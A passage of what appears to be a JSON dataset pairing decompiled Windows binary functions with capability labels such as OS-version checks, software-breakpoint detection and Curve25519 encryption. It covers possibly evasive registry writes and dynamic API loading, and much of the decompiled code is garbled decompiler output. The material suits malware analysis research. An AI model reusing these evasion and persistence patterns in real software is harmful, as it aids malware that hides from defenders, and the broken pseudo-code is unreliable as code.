        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402ad2) overlaps instruction at (ram,0x00402ad1)\n// \n// WARNING: Removing unreachable block (ram,0x00402ac2)\n// WARNING: Removing unreachable block (ram,0x00402ac7)\n// WARNING: Removing unreachable block (ram,0x00402b3d)\n// WARNING: Removing unreachable block (ram,0x00402b6c)\n// WARNING: Removing unreachable block (ram,0x00402b82)\n// WARNING: Removing unreachable block (ram,0x00402bf4)\n// WARNING: Removing unreachable block (ram,0x00402c0a)\n// WARNING: Removing unreachable block (ram,0x00402c2d)\n// WARNING: Removing unreachable block (ram,0x00402faf)\n// WARNING: Removing unreachable block (ram,0x00402fba)\n// WARNING: Removing unreachable block (ram,0x00402c35)\n// WARNING: Removing unreachable block (ram,0x00402c53)\n// WARNING: Removing unreachable block (ram,0x00402fa6)\n// WARNING: Removing unreachable block (ram,0x00402fad)\n// WARNING: Removing unreachable block (ram,0x00402c5b)\n// WARNING: Removing unreachable block (ram,0x00402c76)\n// WARNING: Removing unreachable block (ram,0x00402cdd)\n// WARNING: Removing unreachable block (ram,0x00402f54)\n// WARNING: Removing unreachable block (ram,0x00402f5f)\n// WARNING: Removing unreachable block (ram,0x00402f68)\n// WARNING: Removing unreachable block (ram,0x00402ce5)\n// WARNING: Removing unreachable block (ram,0x00402d00)\n// WARNING: Removing unreachable block (ram,0x00402f2f)\n// WARNING: Removing unreachable block (ram,0x00402d08)\n// WARNING: Removing unreachable block (ram,0x00402d1c)\n// WARNING: Removing unreachable block (ram,0x00402d30)\n// WARNING: Removing unreachable block (ram,0x00402d68)\n// WARNING: Removing unreachable block (ram,0x00402d93)\n// WARNING: Removing unreachable block (ram,0x00402db8)\n// WARNING: Removing unreachable block (ram,0x00402f03)\n// WARNING: Removing unreachable block (ram,0x00402f0b)\n// WARNING: Removing unreachable block (ram,0x00402f11)\n// WARNING: Removing unreachable block (ram,0x00402dc0)\n// WARNING: Removing unreachable block (ram,0x00402eb3)\n// WARNING: Removing unreachable block (ram,0x00402ebe)\n// WARNING: Removing unreachable block (ram,0x00402ec4)\n// WARNING: Removing unreachable block (ram,0x00402ecf)\n// WARNING: Removing unreachable block (ram,0x00402f1c)\n// WARNING: Removing unreachable block (ram,0x00402f22)\n// WARNING: Removing unreachable block (ram,0x00402f2d)\n// WARNING: Removing unreachable block (ram,0x00402f70)\n// WARNING: Removing unreachable block (ram,0x00402f76)\n// WARNING: Removing unreachable block (ram,0x00402dd4)\n// WARNING: Removing unreachable block (ram,0x00402e0e)\n// WARNING: Removing unreachable block (ram,0x00402e21)\n// WARNING: Removing unreachable block (ram,0x00402e23)\n// WARNING: Removing unreachable block (ram,0x00402ed1)\n// WARNING: Removing unreachable block (ram,0x00402ef0)\n// WARNING: Removing unreachable block (ram,0x00402ef6)\n// WARNING: Removing unreachable block (ram,0x00402f01)\n// WARNING: Removing unreachable block (ram,0x00402f37)\n// WARNING: Removing unreachable block (ram,0x00402f3d)\n// WARNING: Removing unreachable block (ram,0x00402f48)\n// WARNING: Removing unreachable block (ram,0x00402f4e)\n// WARNING: Removing unreachable block (ram,0x00402f7a)\n// WARNING: Removing unreachable block (ram,0x00402e58)\n// WARNING: Removing unreachable block (ram,0x00402e6a)\n// WARNING: Removing unreachable block (ram,0x00402e70)\n// WARNING: Removing unreachable block (ram,0x00402e7b)\n// WARNING: Removing unreachable block (ram,0x00402e81)\n// WARNING: Removing unreachable block (ram,0x00402ddb)\n// WARNING: Removing unreachable block (ram,0x00402de6)\n// WARNING: Removing unreachable block (ram,0x00402dec)\n// WARNING: Removing unreachable block (ram,0x00402df7)\n// WARNING: Removing unreachable block (ram,0x00402dfd)\n// WARNING: Removing unreachable block (ram,0x00402e0c)\n// WARNING: Removing unreachable block (ram,0x00402e8c)\n// WARNING: Removing unreachable block (ram,0x00402e92)\n// WARNING: Removing unreachable block (ram,0x00402d23)\n// WARNING: Removing unreachable block (ram,0x00402d2e)\n// WARNING: Removing unreachable block (ram,0x00402d73)\n// WARNING: Removing unreachable block (ram,0x00402d79)\n// WARNING: Removing unreachable block (ram,0x00402d84)\n// WARNING: Removing unreachable block (ram,0x00402d8a)\n// WARNING: Removing unreachable block (ram,0x00402e96)\n// WARNING: Removing unreachable block (ram,0x00402eae)\n// WARNING: Removing unreachable block (ram,0x00402f80)\n// WARNING: Removing unreachable block (ram,0x00402f8a)\n// WARNING: Removing unreachable block (ram,0x00402f90)\n// WARNING: Removing unreachable block (ram,0x00402f9e)\n// WARNING: Removing unreachable block (ram,0x00402fc0)\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: lpdwResult\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_20h\n\nbool __cdecl fcn.00402a60(uint hWnd)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    unkbyte6 Var4;\n    uint var_24ch;\n    uint var_147h;\n    uint hLibModule;\n    uint var_40h;\n    uint var_3ch;\n    uint pbstr;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint lpdwResult;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    Var4 = (*_sym.imp.MSVCRT.dll__strlwr)(hWnd);\n    var_14h = 0x4235bc;\n    var_10h = 0x4235b4;\n    var_ch = 0x4235c4;\n    var_8h = 0x4235cc;\n    var_4h = 0x4235d4;\n    var_24h = Var4 & 0xffff | (Var4 >> 0x20) << 0x10;\n    uVar3 = 0;\n    puVar2 = &var_14h;\n    do {\n        Var4 = (*_sym.imp.MSVCRT.dll_strstr)(hWnd, *puVar2, var_24h);\n        if (Var4 != 0) {\n            return true;\n        }\n        uVar3 = uVar3 + 1;\n        puVar2 = puVar2 + 1;\n    } while (uVar3 < 5);\n    if ((uVar3 != 5) && (uVar3 == 5)) {\n        out(*puVar2, Var4 >> 0x20);\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(hWnd, 0x4235ac);\n    return iVar1 == 0;\n}\n",
        "token_count": 1904
    },
    "00403dd0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint64_t fcn.00403dd0(void)\n\n{\n    uint32_t extraout_EDX;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    return extraout_EDX << 0x20;\n}\n",
        "token_count": 152
    },
    "004042a0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004042a0(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x423208, arg_8h);\n    (*pcVar2)(&var_264h, 0x423220, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x423248;\n    var_30h = 0x423254;\n    var_2ch = 0x423260;\n    var_28h = 0x423270;\n    var_24h = 0x423278;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1085
    },
    "004046c0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004046ee) overlaps instruction at (ram,0x004046ec)\n// \n\nvoid __thiscall fcn.004046c0(uint32_t param_1)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    uchar *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint8_t uVar7;\n    uint8_t uVar8;\n    int32_t iVar9;\n    char *unaff_EBX;\n    uint8_t *puVar10;\n    uint32_t unaff_EDI;\n    bool bVar11;\n    bool bVar12;\n    int32_t in_stack_00000010;\n    uint32_t uVar13;\n    \n    puVar10 = &stack0xfffffffc;\n    iVar9 = 0;\n    bVar11 = false;\n    bVar12 = in_stack_00000010 == 0;\n    uVar13 = unaff_EDI;\n    if (0 < in_stack_00000010) {\n        while( true ) {\n            if ((bVar11 || bVar12) || (!bVar11 && !bVar12)) {\n                param_1 = param_1 & 0xffffff00 | *(iVar9 + *(puVar10 + 0x10));\n            }\n            cVar2 = *unaff_EBX;\n            uVar5 = param_1 >> 8;\n            uVar7 = param_1;\n            uVar4 = param_1 & 0xffff0000;\n            puVar1 = unaff_EDI - 0x75;\n            puVar3 = *puVar1;\n            *puVar1 = *puVar1 - &stack0xffffffe8;\n            *(iVar9 + 0x5750020c) = *(iVar9 + 0x5750020c) + uVar7 + (puVar3 < &stack0xffffffe8);\n            uVar8 = uVar7 ^ *(iVar9 % *(puVar10 + 0xd) + *(puVar10 + 9));\n            *puVar10 = uVar8;\n            param_1 = *(puVar10 + 0x15);\n            unaff_EBX = unaff_EBX & 0xffffff00 | *puVar10;\n            iVar9 = *(puVar10 + -7);\n            *(iVar9 + *(puVar10 + 0x11)) = param_1 ^ *puVar10;\n            uVar6 = iVar9 + 1;\n            bVar11 = uVar6 < param_1;\n            bVar12 = uVar6 == param_1;\n            *(puVar10 + -7) = uVar6;\n            if (param_1 <= uVar6) break;\n            iVar9 = *(puVar10 + -7);\n            puVar10 = puVar10 + 1;\n            unaff_EDI = uVar13;\n            uVar13 = uVar4 | CONCAT11(uVar5 - cVar2, uVar7) & 0xffffff00 | uVar8;\n        }\n    }\n    return;\n}\n",
        "token_count": 683
    },
    "00402020": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402028) overlaps instruction at (ram,0x00402027)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00402020(int32_t param_1, uint32_t *param_2)\n\n{\n    char *pcVar1;\n    uint32_t *puVar2;\n    uchar *puVar3;\n    uint32_t uVar4;\n    uint16_t uVar5;\n    uint32_t in_EAX;\n    uint *puVar6;\n    uint32_t uVar7;\n    char extraout_CH;\n    uint8_t extraout_CH_00;\n    char extraout_CH_01;\n    int32_t extraout_ECX;\n    ushort extraout_DX;\n    uint32_t *extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    uint unaff_EBX;\n    int32_t unaff_EBP;\n    uint *unaff_ESI;\n    uint *puVar8;\n    uint *unaff_EDI;\n    bool bVar9;\n    uchar in_PF;\n    uint8_t in_AF;\n    uchar uVar10;\n    bool bVar11;\n    char cVar12;\n    char cVar13;\n    ulong uVar14;\n    uint uStack28;\n    uint uStack24;\n    uchar uStack20;\n    uchar uStack19;\n    uchar uStack18;\n    uchar uStack17;\n    uchar uStack16;\n    uchar uStack15;\n    uchar uStack14;\n    uchar uStack13;\n    uchar uStack12;\n    ushort uStack11;\n    uchar uStack9;\n    uchar uStack8;\n    ushort uStack7;\n    uchar uStack5;\n    uchar uStack4;\n    ushort uStack3;\n    uchar uStack1;\n    \n    uStack4 = unaff_EBX;\n    uStack3 = unaff_EBX >> 8;\n    uStack1 = unaff_EBX >> 0x18;\n    uStack8 = SUB41(unaff_ESI, 0);\n    uStack7 = unaff_ESI >> 8;\n    uStack5 = unaff_ESI >> 0x18;\n    uStack12 = SUB41(unaff_EDI, 0);\n    uStack11 = unaff_EDI >> 8;\n    uStack9 = unaff_EDI >> 0x18;\n    puVar8 = unaff_ESI;\n    if (in_PF) goto code_r0x0040203a;\n    while( true ) {\n        uStack14 = SUB41(unaff_ESI, 0);\n        uStack13 = unaff_ESI >> 8;\n        puVar8 = unaff_ESI;\n        if (in_PF) {\n            puVar8 = unaff_ESI + 1;\n            out(*unaff_ESI, param_2);\n            do {\n                cVar12 = in_EAX >> 8;\n                in_AF = 9 < (in_EAX & 0xf) | in_AF;\n                in_EAX = CONCAT31(CONCAT21(in_EAX >> 0x10, cVar12 - in_AF), -in_AF);\n            } while (in_AF || cVar12 == *param_2);\n            puVar2 = unaff_EDI + param_2 * 2;\n            uVar7 = *puVar2;\n            uVar4 = *puVar2;\n            *puVar2 = (uVar4 + 0x7b) - in_AF;\n            *(param_1 + 0x6a) = in_EAX;\n            *(in_EAX - 0x74) = *(in_EAX - 0x74) + unaff_EBP + (uVar7 < 0xffffff85 || uVar4 + 0x7b < in_AF);\n            *param_2 = *param_2 ^ in_EAX;\n        }\n        else {\ncode_r0x0040203a:\n            uStack16 = 0x11;\n            uStack15 = 0;\n            uStack14 = 0;\n            uStack13 = 0;\n            uStack20 = 0x8c;\n            uStack19 = 0x31;\n            uStack18 = 0x42;\n            uStack17 = 0;\n        }\n        uStack24 = 0x16;\n        uStack28 = 0x423174;\n        puVar6 = fcn.004046c0();\n        bVar9 = unaff_EDI < puVar6;\n        cVar13 = SBORROW4(unaff_EDI, puVar6);\n        uVar7 = unaff_EDI - puVar6;\n        cVar12 = uVar7 < 0;\n        uVar10 = uVar7 == 0;\n        in_PF = (POPCOUNT(uVar7 & 0xff) & 1U) == 0;\n        uStack16 = 0xf;\n        uStack15 = 0;\n        uStack14 = 0;\n        uStack13 = 0;\n        uStack20 = 0xa8;\n        uStack19 = 0x33;\n        uStack18 = 0x42;\n        uStack17 = 0;\n        uStack24 = 0x16;\n        uStack28 = 0x423174;\n        fcn.004046c0();\n        if ((!bVar9 && !uVar10) && (bVar9 || uVar10)) {\n            *unaff_EDI = *puVar8;\n            unaff_EBP = 0x6ae181d0;\n            cVar13 = '\\0';\n            uVar7 = &uStack28 ^ *extraout_EDX;\n            cVar12 = uVar7 < 0;\n            uVar10 = uVar7 == 0;\n            in_PF = (POPCOUNT(uVar7 & 0xff) & 1U) == 0;\n            puVar8 = puVar8 + 1;\n            unaff_EDI = unaff_EDI + 1;\n        }\n        unaff_ESI = 0x423174;\n        uVar14 = fcn.004046c0(0x423174, 0x16);\n        param_2 = uVar14 >> 0x20;\n        if ((uVar10 || cVar13 != cVar12) || (!uVar10 && cVar13 == cVar12)) break;\n        in_AF = 9 < (uVar14 & 0xf) | in_AF;\n        in_EAX = uVar14 & 0xffff0000 | CONCAT11((uVar14 >> 8) + in_AF, uVar14 + in_AF * '\\x06') & 0xff0f;\n        param_1 = extraout_ECX;\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    fcn.004046c0(0x74, 0x16, 0xc, 10);\n    uStack16 = 0xb;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0x18;\n    uStack19 = 0x34;\n    uStack18 = 0x42;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack28 = 0x423174;\n    fcn.004046c0();\n    uStack16 = 8;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0x24;\n    uStack19 = 0x34;\n    uStack18 = 0x42;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack28 = 0x423174;\n    fcn.004046c0();\n    uStack16 = 9;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0x2c;\n    uStack19 = 0x34;\n    uStack18 = 0x42;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack28 = 0x423174;\n    fcn.004046c0();\n    uStack16 = 9;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0x38;\n    uStack19 = 0x34;\n    uStack18 = 0x42;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack28 = 0x423174;\n    fcn.004046c0();\n    uStack16 = 9;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0x44;\n    uStack19 = 0x34;\n    uStack18 = 0x42;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack28 = 0x423174;\n    fcn.004046c0();\n    uStack16 = 0xc;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0x50;\n    uStack19 = 0x34;\n    uStack18 = 0x42;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack28 = 0x423174;\n    fcn.004046c0();\n    uStack28 = uStack28 & 0xffffff00;\n    fcn.004046c0();\n    uStack15 = 10;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack12 = 0;\n    uStack19 = 0x60;\n    uStack18 = 0x34;\n    uStack17 = 0x42;\n    uStack16 = 0;\n    uStack20 = 0;\n    uStack24 = 0x1600;\n    uStack28 = 0x42317400;\n    fcn.004046c0();\n    uStack15 = 0x40;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack12 = 0;\n    uStack19 = 0x6c;\n    uStack18 = 0x34;\n    uStack17 = 0x42;\n    uStack16 = 0;\n    uStack20 = 0;\n    uStack24 = 0x1600;\n    uStack28._1_3_ = 0x423174;\n    uStack28._0_1_ = 0;\n    fcn.004046c0();\n    puVar3 = puVar8 + 1;\n    *(extraout_EDX_00 + 0x16) = *(extraout_EDX_00 + 0x16) + extraout_CH;\n    uStack28 = uStack28._1_3_ << 8;\n    fcn.004046c0(0x74);\n    uStack3 = 0xb;\n    uStack1 = 0;\n    uStack7 = 0x34b8;\n    uStack5 = 0x42;\n    uStack4 = 0;\n    uStack11 = 0x16;\n    uStack9 = 0;\n    uStack8 = 0;\n    uStack15 = 0x74;\n    uStack14 = 0x31;\n    uStack13 = 0x42;\n    uStack12 = 0;\n    uStack19 = 0x59;\n    uStack18 = 0x22;\n    uStack17 = 0x40;\n    uStack16 = 0;\n    fcn.004046c0();\n    bVar9 = 0xffffffef < &uStack15;\n    bVar11 = *0x10 == 0xffffffff;\n    uStack20 = unaff_EBP >> 0x18;\n    uStack28._1_3_ = puVar3;\n    uStack28._0_1_ = unaff_EDI >> 0x18;\n    uStack3 = 4;\n    uStack1 = 0;\n    uStack7 = 0x34c4;\n    uStack5 = 0x42;\n    uStack4 = 0;\n    uStack11 = 0x16;\n    uStack9 = 0;\n    uStack8 = 0;\n    uStack15 = 0x74;\n    uStack14 = 0x31;\n    uStack13 = 0x42;\n    uStack12 = 0;\n    uStack19 = 0x77;\n    uStack18 = 0x22;\n    uStack17 = 0x40;\n    uStack16 = 0;\n    fcn.004046c0();\n    if ((!bVar9 && !bVar11) && (bVar9 || bVar11)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uStack19 = 4;\n    uStack18 = 0;\n    uStack17 = 0;\n    uStack16 = 0;\n    uStack20 = 0;\n    uStack24 = 0x4234c800;\n    uStack28 = 0x1600;\n    uVar5 = fcn.004046c0(0x74);\n    bVar9 = (CONCAT31(extraout_CH_00 & 0xb, 0xc) & (unaff_EDI & uVar5) + 0xaf70) == 0;\n    uStack3 = 0xc;\n    uStack1 = 0;\n    uStack7 = 0x34cc;\n    uStack5 = 0x42;\n    uStack4 = 0;\n    uStack11 = 0x16;\n    uStack9 = 0;\n    uStack8 = 0;\n    uStack15 = 0x74;\n    uStack14 = 0x31;\n    uStack13 = 0x42;\n    uStack12 = 0;\n    uStack19 = 0xcf;\n    uStack18 = 0x22;\n    uStack17 = 0x40;\n    uStack16 = 0;\n    fcn.004046c0();\n    if ((!bVar9) && (bVar9)) {\n        out(*puVar3, extraout_DX);\n    }\n    uStack19 = 4;\n    uStack18 = 0;\n    uStack17 = 0;\n    uStack16 = 0;\n    uStack20 = 0;\n    uStack24 = 0x4234d800;\n    uStack28 = 0x1600;\n    fcn.004046c0(0x74);\n    pcVar1 = extraout_EDX_01 + 0x16;\n    *pcVar1 = *pcVar1 + extraout_CH_01;\n    bVar9 = *pcVar1 < '\\0';\n    fcn.004046c0(0x74);\n    if ((!bVar9) && (bVar9)) {\n        func_0x6a40656c();\n    }\n    fcn.004046c0();\n    uStack3 = 7;\n    uStack1 = 0;\n    uStack7 = 0x3500;\n    uStack5 = 0x42;\n    uStack4 = 0;\n    uStack11 = 0x16;\n    uStack9 = 0;\n    uStack8 = 0;\n    uStack15 = 0x74;\n    uStack14 = 0x31;\n    uStack13 = 0x42;\n    uStack12 = 0;\n    uStack19 = 100;\n    uStack18 = 0x23;\n    uStack17 = 0x40;\n    uStack16 = 0;\n    fcn.004046c0();\n    return;\n}\n",
        "token_count": 3553
    },
    "00403e50": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403ebe) overlaps instruction at (ram,0x00403ebc)\n// \n// WARNING: This function may have set the stack pointer\n\nuint fcn.00403e50(void)\n\n{\n    code *pcVar1;\n    char cVar4;\n    uint *puVar2;\n    int32_t iVar3;\n    uint8_t extraout_CH;\n    int32_t extraout_ECX;\n    char *pcVar5;\n    uint8_t unaff_BL;\n    uint8_t uVar6;\n    bool bVar7;\n    uint8_t in_AF;\n    ulong uVar8;\n    \n    puVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x423280);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (puVar2 == NULL) {\n        return 0;\n    }\n    *0x423640 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(puVar2, 0x423290);\n    uVar6 = 0;\n    bVar7 = (POPCOUNT(extraout_CH ^ unaff_BL) & 1U) == 0;\n    uVar8 = (*pcVar1)(puVar2, 0x4232ac);\n    pcVar5 = uVar8 >> 0x20;\n    *0x423644 = uVar8;\n    iVar3 = *0x423644;\n    if ((!bVar7) && (bVar7)) {\n        out(*puVar2, uVar8 >> 0x20);\n        uVar6 = in_AF;\n        do {\n            cVar4 = iVar3 >> 8;\n            uVar6 = 9 < (iVar3 & 0xf) | uVar6;\n            iVar3 = CONCAT31(CONCAT21(iVar3 >> 0x10, cVar4 - uVar6), -uVar6);\n        } while (uVar6 || cVar4 == *pcVar5);\n    }\n    *(pcVar1 + pcVar5 * 2) = (*(pcVar1 + pcVar5 * 2) + 0x7b) - uVar6;\n    *(extraout_ECX + 0x68) = iVar3;\n    *0x5600422e = 0x403ec6;\n    *0x423648 = (*pcVar1)();\n    if (((*0x423640 != 0) && (*0x423644 != 0)) && (*0x423648 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 564
    },
    "004025f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004025f0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00404890();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00402750();\n        arg_ch_01 = fcn.00402750();\n        arg_ch_02 = fcn.00402750();\n        fcn.004019c0(arg_10h, arg_ch_00);\n        fcn.004019c0(arg_8h, arg_ch_01);\n        fcn.004019c0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x4231a0, &lpBuffer, arg_10h);\n        iVar2 = fcn.00403880(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x4231ac, &lpBuffer, arg_8h);\n            iVar2 = fcn.00403880(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x4231ac, &lpBuffer, arg_ch);\n                iVar2 = fcn.00403880(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.004019c0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 614
    },
    "00402990": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nbool fcn.00402990(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint var_4h;\n    \n    pvData = 0;\n    var_4h = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x4235dc, 0x423604, &pdwType, &pvData, &var_4h);\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar2 == 6) {\n        return true;\n    }\n    return iVar2 == 7;\n}\n",
        "token_count": 323
    },
    "004033b0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004034ce) overlaps instruction at (ram,0x004034c9)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall\nfcn.004033b0(uint param_1, char *param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7, \n            int32_t param_8)\n\n{\n    code *pcVar1;\n    uchar uVar2;\n    char cVar3;\n    char cVar4;\n    uint in_EAX;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    char cVar6;\n    uint extraout_EDX;\n    uint uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint *puVar10;\n    uint *puVar11;\n    bool bVar12;\n    uint in_stack_ffffffa8;\n    uchar uStack40;\n    uint uStack39;\n    uint *puStack8;\n    \n    cVar3 = param_2;\n    cVar6 = cVar3 + '\\x15';\n    cVar4 = in_EAX >> 8;\n    bVar12 = SBORROW1(cVar6, cVar4);\n    if ((cVar6 < cVar4) || (cVar4 <= cVar6)) {\n        if (bVar12) goto code_r0x004033f1;\n    }\n    else {\n        bVar12 = SCARRY1(*param_2, cVar3);\n        *param_2 = *param_2 + cVar3;\n    }\n    if (bVar12) {\n        LOCK();\n    }\ncode_r0x004033f1:\n    puStack8 = 